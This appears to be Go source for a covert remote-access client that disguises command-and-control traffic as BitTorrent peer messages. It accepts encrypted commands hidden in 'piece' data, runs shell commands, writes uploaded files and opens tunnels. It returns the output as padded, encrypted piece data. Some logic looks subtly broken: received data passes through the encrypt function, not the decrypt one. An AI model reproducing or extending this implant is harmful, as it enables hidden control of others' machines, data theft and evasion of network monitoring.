package razor

import (
	"../config"
	"../peer_protocol"
	"./commands"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"log"
	"net"
)

type Client struct {
	Peer              peer_protocol.PeerConnection
	CurrentPiece      uint32
	CurrentBlockIndex uint32
	CommandOutput     []byte
	nonce             []byte
	enc               *cipher.Block
	LastMsg           bool
	tun               commands.Tunnel
}

func (r *Client) handleChoke() {
	r.Peer.PeerChoking = true
}
func (r *Client) handleUnChoke() {
	r.Peer.PeerChoking = false
}
func (r *Client) handleInterested() {
	r.Peer.PeerInterested = true
}
func (r *Client) handleNotInterested() {
	r.Peer.PeerInterested = false
}
func (r *Client) ChangePiece(haveMsg peer_protocol.Message) {
	r.CurrentPiece = binary.BigEndian.Uint32(haveMsg.Payload)
}
func (r *Client) handleRejection() {
	if r.CurrentBlockIndex == 0 {
		r.CurrentBlockIndex = r.Peer.Config.PieceSize - r.Peer.Config.BlockSize
		r.CurrentPiece = r.CurrentPiece - 1
	} else {
		r.CurrentBlockIndex = r.CurrentBlockIndex - r.Peer.Config.PieceSize
	}
}
func (r *Client) RequestNextBlock(amount int) {
	var messages []peer_protocol.Message
	for i := 0; i < amount; i++ {
		req := peer_protocol.NewRequest(r.CurrentPiece, r.CurrentBlockIndex, r.Peer.Config.BlockSize)
		messages = append(messages, req.Message())
		r.CurrentBlockIndex = r.CurrentBlockIndex + r.Peer.Config.BlockSize
		if r.CurrentBlockIndex > r.Peer.Config.PieceSize {
			// next piece
			r.CurrentBlockIndex = 0
			r.CurrentPiece = r.CurrentPiece + 1
		}
	}
	r.Peer.SendMessage(messages...)
}

func (r *Client) createPieceResponse(req peer_protocol.RequestMessage) ([]byte, error) {
	var chunk []byte
	if len(r.CommandOutput) > int(req.BlockEnd()) {
		chunk = r.CommandOutput[req.BlockOffset:req.BlockEnd()]
		r.LastMsg = false
	} else if len(r.CommandOutput) > int(req.BlockOffset) {
		chunk = r.CommandOutput[req.BlockOffset:]
		r.LastMsg = true
	} else {
		err := io.EOF
		return nil, err
	}
	com := commands.Command{
		Type:    0,
		Payload: chunk,
	}
	paddingSize := int(req.BlockSize+24) - com.BufferLen()
	commandBuffer := append(com.Buffer(), peer_protocol.GenerateRandomBytes(paddingSize)...)
	return commandBuffer, nil
}
func (r *Client) handleBitField(m peer_protocol.Message) {
	r.nonce = m.Payload
	r.Peer.SendMessage(r.Peer.BitField())
}
func (r *Client) EncryptBuffer(buf []byte) []byte {
	aesgcm, err := cipher.NewGCM(*r.enc)
	if err != nil {
		panic(err.Error())
	}
	return aesgcm.Seal(nil, r.nonce, buf, nil)
}

func (r *Client) DecryptBuffer(buf []byte) []byte {
	aesgcm, err := cipher.NewGCM(*r.enc)
	if err != nil {
		panic(err.Error())
	}
	encBuf, err := aesgcm.Open(nil, r.nonce, buf, nil)
	if err != nil {
		panic(err.Error())
	}
	return encBuf
}
func (r *Client) RespondToRequest(req peer_protocol.RequestMessage) {
	chunk, err := r.createPieceResponse(req)
	if err == nil {
		m := peer_protocol.PieceMessage{
			PieceIndex:  req.PieceIndex,
			BlockOffset: req.BlockOffset,
			Data:        r.EncryptBuffer(chunk),
		}
		r.Peer.SendMessage(m.Message())
	} else {
		r.LastMsg = true
	}
}

func (r *Client) Unchoke() {
	r.Peer.SendMessage(r.Peer.UnChoke())
}
func (r *Client) Choke() {
	r.Peer.SendMessage(r.Peer.Choke())
}

func (r *Client) handleCommand(com *commands.Command) error {
	var err error
	switch com.Type {
	case commands.Exec:
		r.CommandOutput, err = commands.RunExec(com.Payload)
		return err
	case commands.Upload:
		if err := commands.SaveFile(com.Payload); err != nil {
			return err
		}
	case commands.StartTunnel:
		r.tun, r.CommandOutput = commands.NewTunnel(com)
	case commands.StopTunnel:
		r.tun.Close()
	case commands.SendOT:
		r.CommandOutput = r.tun.Send(com)
	case commands.RecvOT:
		r.CommandOutput = r.tun.Recv(com)

	default:
		return commands.NewCommandError("Unknown command type: " + string(com.Type))
	}
	return err
}
func (r *Client) MessageCycle() (peer_protocol.Message, error) {
	if m, err := r.Peer.ReceiveMessage(); err == nil {
		switch m.Type {
		case peer_protocol.Bitfield:
			r.handleBitField(m)
		case peer_protocol.Choke:
			r.handleChoke()
		case peer_protocol.Unchoke:
			r.handleUnChoke()
		case peer_protocol.Interested:
			r.handleInterested()
		case peer_protocol.NotInterested:
			r.handleNotInterested()
		case peer_protocol.Have:
			r.ChangePiece(m)
		case peer_protocol.Reject:
			r.handleRejection()
		case peer_protocol.Piece:
			piece := peer_protocol.ReadPiece(m.Payload)
			command := commands.ReadCommand(r.EncryptBuffer(piece.Data))
			r.handleCommand(command)
			if len(r.CommandOutput) > 0 {
				r.Unchoke()
			}
		case peer_protocol.Request:
			req := peer_protocol.RequestFromPayload(m.Payload)
			r.RespondToRequest(req)
			if r.LastMsg {
				r.Choke()
				r.CommandOutput = []byte{}
				r.LastMsg = false
			}
		default:
			log.Printf("Got unknown message type: %d\r\n", m.Type)
		}
		log.Printf("Got message of type %d\r\n", m.Type)
		return m, nil
	} else {
		return m, err
	}
}

func (r *Client) Serve() {
	for r.Peer.Active {
		_, err := r.MessageCycle()
		if err != nil {
			break
		}
		if !r.Peer.PeerChoking {
			log.Println("Requesting command")
			r.RequestNextBlock(1)
		}
	}
}

func NewRazorClient(conn net.Conn, pc *config.PeerConfig, enc *cipher.Block) Client {
	return Client{
		Peer: peer_protocol.NewPeer(conn, pc),
		enc:  enc,
	}
}
